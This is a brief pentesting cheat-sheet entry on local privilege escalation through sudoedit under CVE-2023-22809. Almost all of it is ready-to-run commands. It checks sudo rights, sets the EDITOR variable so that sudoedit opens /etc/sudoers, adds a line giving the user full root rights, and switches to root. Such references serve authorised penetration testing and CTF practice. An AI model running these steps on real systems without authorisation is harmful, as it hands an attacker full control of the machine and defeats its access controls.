# Sudoedit Privilege Escalation

The `sudoedit` command might be vulnerable to privilege escalation.

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
sudo -l

(root) sudoedit /opt/example.txt
```

If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.

### Exploitation ([CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)) <a href="#exploitation-cve-2023-22809" id="exploitation-cve-2023-22809"></a>

```shellscript
export EDITOR="vim -- /etc/sudoers"
sudoedit /opt/example.txt
```

In vim editor, add the following line in **`/etc/sudoers`**.\
Assume the current username is “john”

```shellscript
john ALL=(ALL:ALL) ALL
```

After that, we can escalate to root privilege.

```shellscript
sudo su root
```
